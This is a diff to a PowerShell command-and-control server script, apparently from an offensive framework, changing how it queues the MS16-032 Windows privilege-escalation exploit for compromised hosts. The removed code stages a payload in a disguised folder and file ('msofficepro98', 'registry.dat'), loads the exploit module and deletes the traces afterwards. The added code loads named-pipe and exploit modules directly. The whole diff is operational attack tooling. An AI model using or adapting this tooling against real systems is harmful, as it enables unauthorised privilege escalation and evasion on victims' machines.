@@ -872,25 +872,8 @@ $error.clear()
             }
             if ($pscommand -eq 'invoke-ms16-032')
             { 
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
-                } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = '$payload | out-file c:\programdata\msofficepro98\registry.dat'
-                } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "LoadModule invoke-ms16-032.ps1"
-                } | Out-Null
-                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
+                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                $pscommand = "LoadModule invoke-ms16-032.ps1"
             }
             if ($pscommand -eq 'invoke-ms16-032-proxypayload')
             { 
@@ -900,22 +883,10 @@ $error.clear()
                 VALUES (@RandomURI, @Command)"
                 Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                     RandomURI = $psrandomuri
-                    Command   = "new-item -path c:\programdata\ -name msofficepro98 -Type Directory"
+                    Command   = '$proxypayload = "'+$proxypayload+'"'
                 } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   = "'$proxypayload' | out-file c:\programdata\msofficepro98\registry.dat"
-                } | Out-Null
-                $query = "INSERT INTO NewTasks (RandomURI, Command)
-                VALUES (@RandomURI, @Command)"
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $psrandomuri
-                    Command   =  "LoadModule invoke-ms16-032.ps1"
-                } | Out-Null
-
-                $pscommand = "start-sleep 15; remove-item c:\programdata\msofficepro98 -recurse"
+                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
+                $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
                 $pscommand = 'fvdsghfdsyyh'
